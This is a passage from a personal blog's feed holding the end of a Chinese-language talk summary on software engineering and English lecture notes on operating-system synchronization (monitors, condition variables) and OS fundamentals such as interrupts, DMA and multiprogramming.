&lt;li&gt;醫生和律師利用資訊不對等創造他們的價值 (XDDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;軟體工程師的價值是在於創造出實用價值高的軟體，而不是精通於使用那些軟體。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;趨勢與流行  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2006 - 我會寫 web2.0 我好潮  &lt;/li&gt;
&lt;li&gt;2009 - 我會寫 facebook App 我好潮  &lt;/li&gt;
&lt;li&gt;2011 - 我會寫 mobile App 我好潮  &lt;/li&gt;
&lt;li&gt;2013 - 我會寫 JavaScript (HTML5, NodeJS) 我好潮  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;軟體開發的本質沒有改變  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在不同的平台，寫出可執行的程式  &lt;/li&gt;
&lt;li&gt;程式語言或 framework 只是工具  &lt;/li&gt;
&lt;li&gt;好的資料結構、演算法、系統設計依然重要  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;演算法的重要性 - 你如何開平方根? SQRT(N)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Fast_inverse_square_root"&gt;Fast_inverse_square_root&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;二分逼近法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;left&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;right&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;  
&lt;span class="n"&gt;mid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;left&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;right&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;  
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;mid&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;mid&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
                &lt;span class="n"&gt;right&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mid&lt;/span&gt;  
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
                &lt;span class="n"&gt;left&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mid&lt;/span&gt;  
            &lt;span class="n"&gt;prev&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mid&lt;/span&gt;  
            &lt;span class="n"&gt;mid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;left&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;right&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mf"&gt;2.0&lt;/span&gt;  
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;abs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mid&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;prev&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mf"&gt;1e-6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
                &lt;span class="k"&gt;break&lt;/span&gt;  
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;mid&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;牛頓法  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;快速牛頓法  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;努力解決生活中真實的問題  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows: 讓電腦能輕易為人們使用  &lt;/li&gt;
&lt;li&gt;Google: 整理世界上的訊息，讓人們快速搜尋  &lt;/li&gt;
&lt;li&gt;Yahoo!: 妥善編輯整理各種新聞媒體訊息  &lt;/li&gt;
&lt;li&gt;Facebook: 與你的朋友保持聯繫  &lt;/li&gt;
&lt;li&gt;Apple: 提供人們簡單而一致的使用體驗  &lt;/li&gt;
&lt;li&gt;無名小站: 提供正妹放自拍照、並且快速傳播的平台  &lt;/li&gt;
&lt;li&gt;You:  ???  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;網路學習  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.coursera.org/"&gt;Coursera&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.w3schools.com/"&gt;W3Schools&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/"&gt;Google Developers&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.wolframalpha.com/"&gt;WolframAlpha&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;做你有興趣的事情  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;不要輕視在學校裡面要學的東西，這些都是未來打造你的作品的基礎。  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Microsoft"></category><category term="speech"></category></entry><entry><title>OS Ch6 - Synchronization</title><link href="https://blog.m157q.tw/posts/2013/11/05/os-ch6-synchronization/" rel="alternate"></link><published>2013-11-05T03:07:00+08:00</published><updated>2013-11-05T03:07:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-05:posts/2013/11/05/os-ch6-synchronization/</id><summary type="html">&lt;h1&gt;Monitors&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Invented by &lt;strong&gt;Tony Hoare&lt;/strong&gt; in 1974  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Like a C++ class  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Consists of vars and procedures  &lt;ol&gt;
&lt;li&gt;Only one thread in a monitor at a time (automatic mutual exclusion)  &lt;/li&gt;
&lt;li&gt;Specifal type of variable, called &lt;strong&gt;condition variable&lt;/strong&gt;  &lt;ul&gt;
&lt;li&gt;wait  &lt;/li&gt;
&lt;li&gt;signal  &lt;/li&gt;
&lt;li&gt;broadcast  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;No public variables allowed (must call procedures to access variables)  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A high-level abstraction that provides a convenient and effective mechanism for process synchronization  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Only one process may be active within the monitor at a time  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Condition Variables  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Automatic unlock and lock for mutual exclusion  &lt;/li&gt;
&lt;li&gt;cond.wait () - Thread is put on queue for “cond”, goes to sleep.  &lt;/li&gt;
&lt;li&gt;cond.signal () - If queue for “cond” not empty, wake up on thread  &lt;/li&gt;
&lt;li&gt;cond.broadcast() - Wake up all threads waiting on queue for “cond”  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Semantics of Signal  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Signal and Wait (Hoare-style)  &lt;ul&gt;
&lt;li&gt;Signaler passes lock, CPU to waiter; waiter runs immediately  &lt;/li&gt;
&lt;li&gt;Waiter gives lock, CPU back to signaler when  &lt;ol&gt;
&lt;li&gt;It exits critical section  &lt;/li&gt;
&lt;li&gt;Or, it waits again  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Signal and Continue (Mesa-style)  &lt;ul&gt;
&lt;li&gt;invented by Xerox company  &lt;/li&gt;
&lt;li&gt;signaler continues executing  &lt;/li&gt;
&lt;li&gt;waiter put on ready queue  &lt;/li&gt;
&lt;li&gt;when waiter actually gets to run  &lt;ol&gt;
&lt;li&gt;May have to wait for lock again  &lt;/li&gt;
&lt;li&gt;State may have changed! Use “while”, not “if”  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Used in Java, Pthread  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cs.mtu.edu/~shene/NSF-3/e-Book/MONITOR/monitor-types.html"&gt;Monitor types&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Bounded Buffer by Monitor&lt;br /&gt;
    In Bounded Buffer,  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Enqueue&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;  
        &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;MAX_SIZE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;full&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  

        &lt;span class="n"&gt;BUFFER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;tail&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  
        &lt;span class="n"&gt;tail&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tail&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;MAX_SIZE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  
        &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Deque&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;  
        &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  

        &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;head&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  
        &lt;span class="n"&gt;head&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;MAX_SIZE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  
        &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;MAX_SIZE&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;full&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;BUFFER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Hoare Style  &lt;ul&gt;
&lt;li&gt;Monitor Implementation (using semaphores)  &lt;ul&gt;
&lt;li&gt;Need mutual exclusion semaphore &lt;strong&gt;mutex (init to 1)&lt;/strong&gt; so that only one process is    active within monitor  &lt;/li&gt;
&lt;li&gt;Need a semaphore &lt;strong&gt;next (next to exit)&lt;/strong&gt; for the signaling process to suspend itself  &lt;ul&gt;
&lt;li&gt;initialized to zero  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;next_count&lt;/strong&gt; is number of processes blocked on &lt;strong&gt;next&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;Before exiting a procedure, process must either:  &lt;ol&gt;
&lt;li&gt;Signal other waiting processes in monitor next before exiting  &lt;/li&gt;
&lt;li&gt;Signal mutex and exit  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Monitor Implementation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="nv"&gt;Procedure&lt;/span&gt; &lt;span class="nv"&gt;F:&lt;/span&gt;  
                &lt;span class="nv"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;mutex&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;;  &lt;/span&gt;
                &lt;span class="o"&gt;...&lt;/span&gt;  
                &lt;span class="nv"&gt;body&lt;/span&gt; &lt;span class="nv"&gt;of&lt;/span&gt; &lt;span class="nv"&gt;F&lt;/span&gt;  
                &lt;span class="o"&gt;...&lt;/span&gt;  
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;next_count&lt;/span&gt; &lt;span class="nb"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;;  &lt;/span&gt;
                &lt;span class="nv"&gt;else&lt;/span&gt; &lt;span class="nb"&gt;signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;mutex&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;;  &lt;/span&gt;
    &lt;span class="nv"&gt;end&lt;/span&gt;&lt;span class="c1"&gt;;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+ Condition Variable Implementation
&lt;/pre&gt;&lt;/div&gt;</summary><category term="Operating System"></category></entry><entry><title>OS Ch1 - Introduction to Operating System</title><link href="https://blog.m157q.tw/posts/2013/11/04/os-ch1-introduction-to-operating-system/" rel="alternate"></link><published>2015-10-26T15:30:00+08:00</published><updated>2015-10-26T15:30:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-04:posts/2013/11/04/os-ch1-introduction-to-operating-system/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;What is an Operating System?  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A program that acts as an intermediary between an application and the computer hardware  &lt;/li&gt;
&lt;li&gt;A program that provides a convenient interface to the user  &lt;/li&gt;
&lt;li&gt;Controls and coordinates use of hardware among various applications and users  &lt;/li&gt;
&lt;li&gt;Provides a multi-user environment  &lt;ul&gt;
&lt;li&gt;time-sharing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Distributed computing  &lt;/li&gt;
&lt;li&gt;Cloud computing  &lt;/li&gt;
&lt;li&gt;a piece of program (or pieces of programs)  &lt;/li&gt;
&lt;li&gt;a resource allocator  &lt;/li&gt;
&lt;li&gt;a control program  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Computer system can be divided into four components  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Hardware  &lt;/li&gt;
&lt;li&gt;Operating system  &lt;/li&gt;
&lt;li&gt;Application programs  &lt;/li&gt;
&lt;li&gt;Users  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;“The one program running at all times on the computer” is the kernel."&lt;br /&gt;
"Everything else is either a system program (ships with the operating system) or an application program."  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Computer-System operation  &lt;ul&gt;
&lt;li&gt;One or more CPUs, device controllers connect through common bus providing access to&lt;br /&gt;
  shared memory  &lt;/li&gt;
&lt;li&gt;Concurrent execution of CPUs and devices competing for memory cycles  &lt;/li&gt;
&lt;li&gt;I/O devices and the CPU can execute concurrently  &lt;/li&gt;
&lt;li&gt;Each device controller is in charge of a particular device type  &lt;/li&gt;
&lt;li&gt;Each device controller has a local buffer  &lt;/li&gt;
&lt;li&gt;CPU moves data from/to main memory to/from local buffers  &lt;/li&gt;
&lt;li&gt;I/O is from the device to local buffer of controller  &lt;/li&gt;
&lt;li&gt;Device controller informs CPU that it has finished its operation by causing an interrupt  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;￼Common Functions of Interrupts  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Interrupt transfers control to the interrupt service routine generally, through the &lt;strong&gt;interrupt vector, which contains the addresses of all the service routines&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;Interrupt architecture must save the address of the interrupted instruction  &lt;/li&gt;
&lt;li&gt;Incoming interrupts are disabled while another interrupt is being processed to prevent       a lost interrupt  &lt;/li&gt;
&lt;li&gt;A &lt;strong&gt;trap is a software-generated interrupt caused either by an error or a user request&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;An operating system is &lt;strong&gt;interrupt driven&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Interrupts&lt;br /&gt;
&lt;img alt="Interrupt Vectors in Liunx" src="/files/os-ch1/interrupt-vectors-in-linux.png" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;I/O structure  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;After I/O starts, control returns to user program only upon I/O completion  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Wait instruction idles the CPU until the next interrupt  &lt;/li&gt;
&lt;li&gt;At most one I/O request is outstanding at a time, no simultaneous I/O processing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;I/O muliplexing&lt;/strong&gt; After I/O starts, control returns to user program without waiting f              or I/O completion  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;System call&lt;/strong&gt; – request to the operating system to allow user to wait for I/O&lt;br /&gt;
    completion  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Device-status table&lt;/strong&gt; contains entry for each I/O device indicating its type,&lt;br /&gt;
    address, and state  &lt;/li&gt;
&lt;li&gt;Operating system indexes into I/O device table to determine device status and to&lt;br /&gt;
    modify table entry to include interrupt  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Direct Memory Access Structure (DMA)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Device controller transfers blocks of data from buffer storage directly to main&lt;br /&gt;
  memory without CPU intervention  &lt;/li&gt;
&lt;li&gt;Only one interrupt is generated per block, rather than the one interrupt per byte  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Storage Structure  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Main memory  &lt;/li&gt;
&lt;li&gt;Secondary storage - extension of main memory that provides nonvolatile&lt;br /&gt;
     capacity  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Magnetic disks  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Disk surface is logically divided into tracks, which are subdivided into sectors  &lt;/li&gt;
&lt;li&gt;The &lt;strong&gt;disk controller&lt;/strong&gt; determines the logical interaction between the device&lt;br /&gt;
     and the computer  &lt;/li&gt;
&lt;li&gt;NCQ vs no NCQ  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Storage Hierarchy  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Speed  &lt;/li&gt;
&lt;li&gt;Cost  &lt;/li&gt;
&lt;li&gt;Volatility  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Caching  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;copying information into faster storage system; main memory&lt;br /&gt;
  can be viewed as a last cache for secondary storage  &lt;/li&gt;
&lt;li&gt;Information in use copied from slower to faster storage temporarily  &lt;/li&gt;
&lt;li&gt;Faster storage (cache) checked first to determine if information is there  &lt;/li&gt;
&lt;li&gt;Cache smaller than storage being cached  &lt;ul&gt;
&lt;li&gt;Cache management important design problem  &lt;/li&gt;
&lt;li&gt;Cache size and replacement policy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Computer-System Architecture  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;single general-purpose processor (PDAs through mainframes)  &lt;/li&gt;
&lt;li&gt;special-purpose processors  &lt;/li&gt;
&lt;li&gt;Multiprocessors systems == parallel systems == tightly-coupled systems  &lt;ul&gt;
&lt;li&gt;Increased throughput  &lt;/li&gt;
&lt;li&gt;Economy of scale  &lt;/li&gt;
&lt;li&gt;Increased reliability – graceful degradation or fault tolerance  &lt;/li&gt;
&lt;li&gt;Two types  &lt;ul&gt;
&lt;li&gt;Asymmetric Multiprocessing  &lt;/li&gt;
&lt;li&gt;Symmetric Multiprocessing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Clustered Systems  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;multiple systems working together  &lt;/li&gt;
&lt;li&gt;Usually sharing storage via a storage-area network (SAN)  &lt;/li&gt;
&lt;li&gt;Provides a high-availability service which survives failures  &lt;ul&gt;
&lt;li&gt;Asymmetric clustering has one machine in hot-standby mode  &lt;/li&gt;
&lt;li&gt;Symmetric clustering has multiple nodes running applications, monitoring&lt;br /&gt;
  each other  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Some clusters are for high-performance computing (HPC). Applications must be written to        use parallelization  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Computer Startup  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;bootstrap program is loaded at power-up or reboot  &lt;ul&gt;
&lt;li&gt;Typically stored in ROM or EPROM, generally known as firmware  &lt;/li&gt;
&lt;li&gt;Initializes all aspects of system  &lt;/li&gt;
&lt;li&gt;Loads operating system kernel and starts execution  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Operating system probes and initializes hardware  &lt;/li&gt;
&lt;li&gt;Hardware provides the driving power  &lt;/li&gt;
&lt;li&gt;Operating system administers the power to system services and applications (jobs)  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Operating System Structure  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Multiprogramming  &lt;ul&gt;
&lt;li&gt;Needed for efficiency  &lt;/li&gt;
&lt;li&gt;Single user cannot keep CPU and I/O devices busy at all times  &lt;/li&gt;
&lt;li&gt;Organizes jobs (code and data) so CPU always has one to execute  &lt;/li&gt;
&lt;li&gt;A subset of total jobs in system is kept in memory  &lt;/li&gt;
&lt;li&gt;One job selected and run via &lt;strong&gt;job scheduling&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;When it has to wait (for I/O for example), OS &lt;strong&gt;switches to another job&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Timesharing (multitasking)  &lt;ul&gt;
&lt;li&gt;logical extension in which CPU switches jobs so frequently that users can interact&lt;br /&gt;
    with each job while it is running, creating &lt;strong&gt;interactive&lt;/strong&gt; computing  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Response time&lt;/strong&gt; should be &amp;lt; 1 second  &lt;/li&gt;
&lt;li&gt;Each user has at least one &lt;strong&gt;program executing in memory =&amp;gt; process&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;If several jobs ready to run at the same time =&amp;gt; &lt;strong&gt;CPU scheduling&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;If processes don’t fit in memory, &lt;strong&gt;swapping&lt;/strong&gt; moves them in and out to run  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Virtual memory&lt;/strong&gt; allows execution of processes not completely in memory  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Operating-System Operations  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Interrupt&lt;/strong&gt; driven by hardware  &lt;/li&gt;
&lt;li&gt;Software error or request creates &lt;strong&gt;exception&lt;/strong&gt; or &lt;strong&gt;trap&lt;/strong&gt;  &lt;ul&gt;
&lt;li&gt;Division by zero, request for operating system service  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Dual-mode&lt;/strong&gt; operation allows OS to protect itself and other system components  &lt;ul&gt;
&lt;li&gt;&lt;strong&gt;User mode&lt;/strong&gt; and &lt;strong&gt;kernel mode&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Mode bit&lt;/strong&gt; provided by hardware  &lt;ul&gt;
